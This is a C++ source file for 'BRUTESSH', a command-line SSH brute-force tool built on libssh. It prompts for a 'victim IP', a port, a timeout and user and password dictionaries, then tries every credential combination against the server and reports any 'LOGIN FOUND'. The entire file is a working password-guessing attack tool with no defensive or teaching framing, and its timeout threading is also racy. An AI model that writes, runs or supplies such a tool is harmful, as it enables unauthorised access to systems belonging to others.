#include <libssh/libssh.h>
#include <iostream>
#include <fstream>
#include <string>
#include <sstream>
#include <algorithm>
#include <thread>
#include <chrono>
#include <future>

using namespace std;

int minmili;
int lastchoice = 2;

//para conectarse via ssh
void connectSSH(string host, int port, string user, string password){

    int rc;
    ssh_session my_ssh_session;


    my_ssh_session = ssh_new();


    ssh_options_set(my_ssh_session, SSH_OPTIONS_HOST, host.c_str());
    ssh_options_set(my_ssh_session, SSH_OPTIONS_USER, user.c_str());
    ssh_options_set(my_ssh_session, SSH_OPTIONS_PORT, &port);

    rc = ssh_connect(my_ssh_session);


    if (rc != SSH_OK) {
        printf("Error connecting to SSH server\n");
        ssh_free(my_ssh_session);
        lastchoice = -1;
    }





    rc = ssh_userauth_password(my_ssh_session, NULL, password.c_str());
    //si no se conecta
    if (rc != SSH_AUTH_SUCCESS) {
        cout << "User: " << user << " Password: " << password << " ---> NOT FOUND (X)\n" << endl;
        ssh_disconnect(my_ssh_session);
        ssh_free(my_ssh_session);
        lastchoice = 1;

    //si se conecta
    } else {
        cout << "\033[1;32mUser: " << user << " Password: " << password << " ---> LOGIN FOUND (V)\033[0m" << endl;
        ssh_disconnect(my_ssh_session);
        ssh_free(my_ssh_session);
        lastchoice = 0;
    }


}

//to check if a string is an int
bool isInteger(const string& str) {
    istringstream iss(str);
    int value;
    iss >> value;
    return !iss.fail() && iss.eof();
}


//for timeout
int future_connectSSH(string host, int port, string user, string password, int miliseconds){


    std::thread t([&]() {
       connectSSH(host, port, user, password);
    });


    std::this_thread::sleep_for(std::chrono::milliseconds(miliseconds));


    if (t.joinable()) {
        cout << "User: " << user << " Password: " << password << " ---> TIMEOUT (X)\n" << endl;
        t.detach();
    } else {

        t.join();
        
    }

    return lastchoice;
    
}

int main(){
    

    string mili_s;
    int miliseconds;
    string host;
    string user;
    string password;
    string port_s;
    int port;


    //input
    printf("BRUTESSH\n");
    printf("Select the victim IP: ");
    cin >> host;
    
    printf("Select the victim port: ");
    cin >> port_s;
    //check if port is a number
    if (!isInteger(port_s)){
        printf("ERROR: the port must be a number\n");
        return 1;
    }
    istringstream iss(port_s);
    iss >> port;

    printf("Set the milliseconds for timeout: ");
    cin >> mili_s;
    if (!isInteger(mili_s)){
        printf("ERROR: the milliseconds must be a number\n");
        return 1;
    }

    istringstream oss(mili_s);
    oss >> miliseconds;

    minmili = miliseconds;
    printf("Select a user or a user dictionary: ");
    cin >> user;
    printf("Select a password or a password dictionary: ");
    cin >> password;

    //remove single quotes from the strings
    user.erase(remove_if(user.begin(), user.end(), [](char c) { return c == '\''; }), user.end());
    password.erase(remove_if(password.begin(), password.end(), [](char c) { return c == '\''; }), password.end());

    //abrir archivos
    ifstream file_u(user);
    ifstream file_p(password);
    
    bool u_d = true;
    bool p_d = true;

    
    //si no se abre lo detecta como nombre
    if (!file_u.is_open()) {
        printf("Error opening the dictionary, setting as user\n");
        u_d = false;
        
    }

    if (!file_p.is_open()) {
        printf("Error opening the dictionary, setting as password\n");
        p_d = false;
    }

    //testear tiempo, si el timeout dura demasiado se rebaja al limite normal
    auto startTime = std::chrono::high_resolution_clock::now();
    connectSSH(host, port, "test", "test");
    auto endTime = std::chrono::high_resolution_clock::now();
    int resta = std::chrono::duration_cast<std::chrono::milliseconds>(endTime - startTime).count();
    if (resta < minmili){
        minmili = resta;
    }

    //si el usuario no es diccionario
    if (!u_d){
        
        //si la contrasenya no es diccionario
        if (!p_d){

            int result = future_connectSSH(host, port, user, password, minmili);
            if (result == 0 || result == -1){
                return result;
            }
        //si la contrasenya si es diccionario
        } else {
            string line;
            while (getline(file_p, line)) {


                
                int result = future_connectSSH(host, port, user, line, minmili);
                if (result == 0 || result == -1){
                    return result;
                }

            }

        }

    //si el usuario es diccionario
    } else {

        //si la contrasenya no es diccionario
        if (!p_d){

            string line;
            while (getline(file_u, line)) {


                int result = future_connectSSH(host, port, line, password, minmili);
                if (result == 0 || result == -1){
                    return result;
                }
            }
            

        //si la contrasenya es diccionario
        } else {
            string line_u;
            string line_p;
            while (getline(file_u, line_u)) {

                while (getline(file_p, line_p)){

          
                int result = future_connectSSH(host, port, line_u, line_p, minmili);
                if (result == 0 || result == -1){
                    return result;
                }

                }
                file_p.clear();
                file_p.seekg(0, ios::beg);

            }

        }

    }


    return 0;
}